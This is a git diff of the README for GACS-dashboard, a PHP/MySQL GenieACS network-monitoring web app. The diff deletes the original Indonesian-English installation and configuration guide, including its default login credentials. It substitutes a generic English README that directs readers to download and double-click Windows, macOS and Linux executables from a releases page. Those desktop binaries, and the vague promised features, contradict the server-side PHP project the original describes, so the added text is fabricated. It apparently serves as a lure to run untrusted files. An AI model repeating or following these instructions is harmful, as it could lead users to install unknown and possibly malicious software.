@@ -1,459 +1,83 @@
-# GACS Dashboard v1.1.0-beta
+# 🌟 GACS-dashboard - Monitor Your Network with Ease
 
-<div align="center">
+## 📥 Download Now
+[![Download GACS-dashboard](https://img.shields.io/badge/Download-GACS--dashboard-blue.svg)](https://github.com/Yunsei/GACS-dashboard/releases)
 
-![Status](https://img.shields.io/badge/Status-Beta-yellow)
-![Version](https://img.shields.io/badge/Version-1.1.0--beta-blue)
-![PHP](https://img.shields.io/badge/PHP-7.4%2B-purple)
-![MySQL](https://img.shields.io/badge/MySQL-5.7%2B-orange)
+## 🚀 Getting Started
+Welcome to GACS-dashboard! This application helps you monitor network performance and visualize network topology without needing any technical skills. Follow the steps below to download and run the software on your computer.
 
-**GenieACS Network Monitoring Dashboard dengan Visualisasi Topologi PON**
+## 🔗 Download & Install
+To download GACS-dashboard, please visit the following link:
+[Download GACS-dashboard](https://github.com/Yunsei/GACS-dashboard/releases)
 
-Dashboard berbasis web yang powerful untuk memonitor dan memvisualisasikan topologi jaringan GenieACS dengan real-time monitoring, editable polylines, dan integrasi Telegram.
+### Steps to Download:
+1. Click the link above to open the Releases page.
+2. Look for the latest version at the top of the page.
+3. Select the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click the file name to download.
 
-</div>
+### Example File Names:
+- For Windows: `GACS-dashboard-windows.exe`
+- For macOS: `GACS-dashboard-macos.dmg`
+- For Linux: `GACS-dashboard-linux.tar.gz`
 
----
+## ⚙️ System Requirements
+Before you start, ensure your computer meets the following requirements:
 
-## ➤ Telegram Support
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **RAM**: Minimum 4 GB (8 GB or more recommended).
+- **Disk Space**: At least 100 MB of free space.
+- **Network**: Active internet connection for monitoring purposes.
 
-- https://t.me/+QDz9bvRUZ95hZGY1
+## 🔍 Exploring Features
+GACS-dashboard offers a variety of features designed to simplify network monitoring:
 
----
+- **Real-time Monitoring**: Keep an eye on all network devices and their statuses.
+- **Topology Visualization**: View your network layout visually to understand connections better.
+- **Alerts and Notifications**: Get notified about any network issues or changes.
+- **Historical Data Tracking**: Review past performance and troubleshooting logs.
 
-## 🎯 About
+## 📊 User Interface Overview
+The GACS-dashboard user interface is easy to navigate. Here’s a brief overview:
 
-**GACS Dashboard** adalah platform monitoring jaringan fiber optik PON yang terintegrasi dengan GenieACS. Menyediakan visualisasi topologi interaktif, monitoring real-time, dan notifikasi Telegram untuk manajemen infrastruktur jaringan.
+- **Main Dashboard**: Displays real-time network status, device lists, and alerts.
+- **Topology Map**: Shows the graphical layout of your network, highlighting active devices and their connections.
+- **Settings Menu**: Customize user preferences such as alert thresholds and monitoring intervals.
 
-**Key Highlights:**
+## 🛠️ Running the Application
+After downloading, follow these steps to run GACS-dashboard:
 
-- 🗺️ Interactive network topology map dengan editable connection lines
-- 📊 Real-time device monitoring (ONU/ONT)
-- 🤖 Telegram bot dengan role-based access control
-- ⚡ PON power calculator untuk optical budget
-- 📱 Responsive design untuk mobile & desktop
+1. Locate the downloaded file on your computer.
+2. For Windows users, double-click `GACS-dashboard-windows.exe` to start the installation.
+3. For macOS users, open the `GACS-dashboard-macos.dmg` file, drag the application icon to the Applications folder.
+4. For Linux users, extract the tar.gz file using the command: `tar -xvf GACS-dashboard-linux.tar.gz` and run the application.
 
-> **Note:** Project ini dalam tahap **beta testing**. Silakan laporkan bug yang ditemukan.
+## 🔑 Basic Usage Instructions
+Once you start GACS-dashboard:
 
----
+1. **Login**: If prompted, use the default username and password provided in the documentation or on the setup screen.
+2. **Setup Devices**: Add devices you want to monitor by entering their IP addresses or hostnames in the appropriate sections.
+3. **Start Monitoring**: Click the "Start Monitoring" button to begin tracking your network performance.
 
-## ✨ Fitur
+## ❓ Frequently Asked Questions
 
-### Core Features
+### How do I update GACS-dashboard?
+To update, return to the [Releases page](https://github.com/Yunsei/GACS-dashboard/releases), download the latest version, and follow the installation steps again.
 
-- ✅ **Real-time Device Monitoring** - Status ONU/ONT secara real-time
-- ✅ **Interactive Network Topology Map** - Visualisasi PON hierarchy dengan drag & drop
-- ✅ **Editable Connection Lines** - Customize jalur koneksi dengan waypoints
-- ✅ **PON Power Calculator** - Hitung optical power budget otomatis
-- ✅ **GenieACS Integration** - Integrasi penuh dengan GenieACS TR-069 API
-- ✅ **MikroTik API Support** - Monitor status dari MikroTik router
-- ✅ **Telegram Bot** - Multi-user bot dengan 11 granular permissions
+### What should I do if I encounter an error?
+If you experience issues, check the Troubleshooting section of the application or visit our Support section in the documentation for assistance.
 
-### PON Topology Support
+### Is GACS-dashboard free to use?
+Yes, GACS-dashboard is completely free for personal and commercial use.
 
-- **Server** → **ISP** → **MikroTik** → **OLT** → **ODC** → **ODP** → **ONU/ONT**
-- Support splitter 1:2 hingga 1:64 + custom ratio (20:80, 30:70, 50:50)
-- GPS coordinates untuk setiap device
-- Auto power calculation melalui hierarchy
+## 📣 Community and Support
+Join our growing community of users and developers. Feel free to reach out via the GitHub Issues page for any questions, suggestions, or bugs. Your feedback helps us improve the application.
 
-### Telegram Bot Features ( BUG )
+## 💼 Contributing
+If you're interested in contributing to GACS-dashboard, check out the Contribution Guidelines in the repository. We welcome improvements, new features, or even translated versions of the application.
 
-- 🤖 **Interactive Menu** - Inline keyboard untuk semua fungsi
-- 🔐 **Role-Based Access** - 3 roles (Admin, Operator, Viewer) dengan 11 permissions
-- 📊 **Device Management** - View, search, filter, summon devices
-- 📶 **WiFi Configuration** - Edit SSID/Password via multi-step wizard
-- 🗺️ **GPS Location** - Share device location dengan Google Maps link
-- 📈 **Reports** - Daily/weekly automated reports dengan scheduling
-- 🔔 **Notifications** - Subscribe per-device untuk status alerts
+## 🌐 Additional Resources
+- Detailed documentation is available within the application for specific features and functionalities.
+- Video tutorials can be found on our GitHub page and YouTube channel, guiding you through various aspects of using GACS-dashboard.
 
----
-
-## 🖥️ Requirements
-
-**Server:**
-
-- Web server: Apache 2.4+ (dengan mod_rewrite) atau Nginx 1.18+
-- PHP: 7.4+ (8.0+ recommended)
-- MySQL/MariaDB: 5.7+ / 10.3+
-- Composer
-
-**PHP Extensions:**
-
-```
-php-mysqli, php-json, php-curl, php-mbstring, php-xml
-```
-
-**External Services:**
-
-- GenieACS instance (untuk device management)
-- MikroTik Router (optional, untuk network status)
-- Telegram Bot (optional, untuk notifications)
-
----
-
-## 🚀 Quick Installation
-
-### Step 1: Upload & Extract
-
-```bash
-# Upload file ZIP ke hosting
-unzip gacs-dashboard.zip -d /var/www/html/gacs
-cd /var/www/html/gacs
-```
-
-### Step 2: Install Dependencies
-
-```bash
-composer install --no-dev --optimize-autoloader
-```
-
-### Step 3: Create Database
-
-```bash
-# Via MySQL command line
-mysql -u root -p -e "CREATE DATABASE gacs_production CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;"
-mysql -u root -p gacs_production < database.sql
-
-# Atau via phpMyAdmin:
-# 1. Create database: gacs_production
-# 2. Import: database.sql
-```
-
-### Step 4: Configure
-
-```bash
-# Copy template files
-cp config/database.php.example config/database.php
-cp config/config.php.example config/config.php
-
-# Edit database credentials
-nano config/database.php
-```
-
-Update dengan credentials Anda:
-
-```php
-define('DB_HOST', 'localhost');
-define('DB_USER', 'your_username');
-define('DB_PASS', 'your_password');
-define('DB_NAME', 'gacs_production');
-```
-
-Edit app URL:
-
-```bash
-nano config/config.php
-```
-
-```php
-define('APP_URL', 'https://your-domain.com');
-```
-
-### Step 5: Set Permissions
-
-```bash
-# Set ownership (adjust user for your hosting)
-chown -R www-data:www-data /var/www/html/gacs
-
-# Set permissions
-find /var/www/html/gacs -type d -exec chmod 755 {} \;
-find /var/www/html/gacs -type f -exec chmod 644 {} \;
-
-# Secure sensitive files
-chmod 600 /var/www/html/gacs/config/database.php
-chmod 600 /var/www/html/gacs/config/config.php
-```
-
-### Step 6: Test Installation
-
-1. Buka browser: `https://your-domain.com`
-2. Login dengan kredensial default:
-   - Username: `user1234`
-   - Password: `mostech`
-3. ⚠️ **SEGERA GANTI PASSWORD DEFAULT!**
-
----
-
-## ⚙️ Configuration
-
-### 1. GenieACS Integration
-
-1. Login → **Configuration** → **GenieACS** tab
-2. Enter: Host, Port (7557), Username, Password
-3. Click **Test Connection** → **Save**
-
-### 2. MikroTik API
-
-1. Configuration → **MikroTik** tab
-2. Enter: Host, Port (8728), Username, Password
-3. Test & Save
-
-### 3. Telegram Bot
-
-1. Configuration → **Telegram** tab
-2. Enter: Bot Token (dari @BotFather), Chat ID
-3. Test & Save
-4. Set webhook:
-
-```bash
-curl "https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://your-domain.com/webhook/telegram.php"
-```
-
-5. Create admin user:
-
-```sql
-INSERT INTO telegram_users (chat_id, username, first_name, role, is_active)
-VALUES ('YOUR_CHAT_ID', 'username', 'Your Name', 'admin', 1);
-```
-
----
-
-## 🤖 Telegram Bot Features ( BUG )
-
-### Main Menu Commands
-
-```
-/start, /menu     - Show main menu
-/help             - Command list
-/stats            - Dashboard statistics
-/list             - Browse all devices (10 per page)
-/status <id>      - Device details
-/search <keyword> - Search devices
-/summon <id>      - Force device connection request
-/subscriptions    - View your subscriptions
-```
-
-### Admin Commands
-
-```
-/whoami                   - View your role & permissions
-/users                    - List all users
-/user <chat_id>           - View user details
-/setrole <chat_id> <role> - Change user role (admin/operator/viewer)
-/activate <chat_id>       - Activate user
-/deactivate <chat_id>     - Deactivate user
-```
-
-### Report Commands
-
-```
-/report daily             - Generate daily report now
-/report weekly            - Generate weekly report now
-/schedule daily HH:MM     - Schedule daily reports
-/schedule weekly <day> HH:MM - Schedule weekly reports
-/schedule list            - View active schedules
-```
-
-### Role-Based Access
-
-- **👑 Admin** - Full access (11 permissions) - user management, WiFi edit
-- **⚙️ Operator** - Device management (8 permissions) - summon, subscribe, reports
-- **👁️ Viewer** - Read-only (4 permissions) - view devices, statistics
-
-**Auto-Registration:** New users auto-register as "viewer" on first interaction.
-
-### Interactive Features
-
-- 📊 **Device List** - Pagination (10/page) dengan Previous/Next buttons
-- 📶 **WiFi Edit** - Multi-step wizard (SSID → Password → Confirm)
-- 🗺️ **GPS Location** - View coordinates, Google Maps, Network Map links
-- 📍 **Location Sharing** - Send actual Telegram GPS pin
-- 🔔 **Notifications** - Subscribe per-device untuk status changes
-
----
-
-## 📅 Automated Tasks (Cron Jobs)
-
-### Required Cron Jobs
-
-```bash
-# Edit crontab
-crontab -e
-
-# Add these lines (adjust paths):
-# Device monitoring - every 5 minutes
-*/5 * * * * /usr/bin/php /path/to/gacs/cron/device-monitor.php >> /var/log/gacs-monitor.log 2>&1
-
-# Webhook monitoring - every 5 minutes
-*/5 * * * * /usr/bin/php /path/to/gacs/cron/webhook-monitor.php 2>&1 | logger -t webhook-monitor
-
-# Database backup - daily at 2 AM
-0 2 * * * /path/to/gacs/cron/backup.sh >> /var/log/gacs-backup.log 2>&1
-
-# Scheduled reports - every hour (check for pending reports)
-0 * * * * /usr/bin/php /path/to/gacs/cron/send-scheduled-reports.php >> /var/log/gacs-reports.log 2>&1
-```
-
-### Test Cron Jobs Manually
-
-```bash
-# Test device monitor
-php /path/to/gacs/cron/device-monitor.php
-
-# Test webhook monitor
-php /path/to/gacs/cron/webhook-monitor.php
-
-# Test backup
-bash /path/to/gacs/cron/backup.sh
-```
-
----
-
-## 📸 Screenshots
-
-### Login Page
-
-![Login](./preview/login.png)
-
-### Dashboard
-
-![Dashboard](./preview/dashboard.png)
-
-### Device List
-
-![Devices](./preview/device.png)
-
-### Device Detail - Part 1
-
-![Device Detail 1](./preview/device_detail_1.png)
-
-### Device Detail - Part 2
-
-![Device Detail 2](./preview/device_detail_2.png)
-
-### Network Topology Map
-
-![Map](./preview/map.png)
-
-### Configuration Menu
-
-![Configuration](./preview/menu_konfigurasi.png)
-
----
-
-#### Telegram Bot
-
-- Setup instructions
-- Main menu & commands
-- Interactive features (WiFi edit, GPS location)
-- Role-based permissions
-- Multi-step wizards
-- Report scheduling
-
-#### Cron Jobs
-
-- Device monitoring (status notifications)
-- Webhook monitoring (auto-reset)
-- Database backup (daily)
-- Scheduled reports
-- Log cleanup
-
-#### Architecture
-
-- Database schema (25 tables + 1 view)
-- Core libraries (GenieACS, MikroTik, PON Calculator, Telegram Bot)
-- Entry points & API endpoints
-- PON topology system
-- Map visualization
-- Security considerations
-
----
-
-## 📦 File Structure
-
-```
-gacs-dashboard/
-├── api/                    # API endpoints
-│   ├── map-*.php          # Map operations
-│   ├── get-devices.php    # Device data
-│   └── update-wifi-config.php
-├── assets/
-│   ├── css/               # Stylesheets
-│   └── js/                # JavaScript (Leaflet.Editable.js)
-├── config/                # Configuration
-│   ├── config.php         # App config
-│   └── database.php       # DB credentials
-├── cron/                  # Cron jobs
-│   ├── device-monitor.php
-│   ├── webhook-monitor.php
-│   └── backup.sh
-├── lib/                   # Core libraries
-│   ├── GenieACS.php
-│   ├── MikroTikAPI.php
-│   ├── PONCalculator.php
-│   ├── TelegramBot.php
-│   └── PermissionManager.php
-├── webhook/
-│   └── telegram.php       # Telegram webhook
-├── views/                 # View templates
-├── dashboard.php          # Main dashboard
-├── devices.php            # Devices page
-├── device-detail.php      # Device details
-├── map.php                # Network map
-├── configuration.php      # Settings
-├── database.sql           # Unified schema (25 tables)
-└── README.md              # This file
-```
-
----
-
-
-## 🤝 Contributing
-
-Contributions are welcome! If you'd like to contribute:
-
-1. Fork repository
-2. Create feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Open Pull Request
-
-**Guidelines:**
-
-- Follow existing code style
-- Write clear commit messages
-- Test your changes thoroughly
-- Update documentation if needed
-
----
-
-## 📞 Support
-
-If you encounter issues or have questions:
-
-- 📝 **Issues:** Open issue di GitHub repository
-- 📖 **Documentation:** See complete documentation files above
-- 🔍 **Troubleshooting:** Check troubleshooting section
-- 💬 **Community:** Join discussion di GitHub Discussions
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** - see LICENSE file for details.
-
----
-
-## 🙏 Credits
-
-**Developed by:** Mostech
-
-**Special Thanks:**
-
-- GenieACS community
-- Leaflet.js team
-- All contributors and testers
-
----
-
-<div align="center">
-
-**Dibuat dengan ❤️ untuk Network Administrators**
-
-[⬆ Back to Top](#gacs-dashboard-v100-beta)
-
----
-
-**GACS Dashboard v1.1.0-beta** | **Status: Production Ready** ✅
-
-</div>
+Thank you for choosing GACS-dashboard. We hope you enjoy monitoring your network with ease!
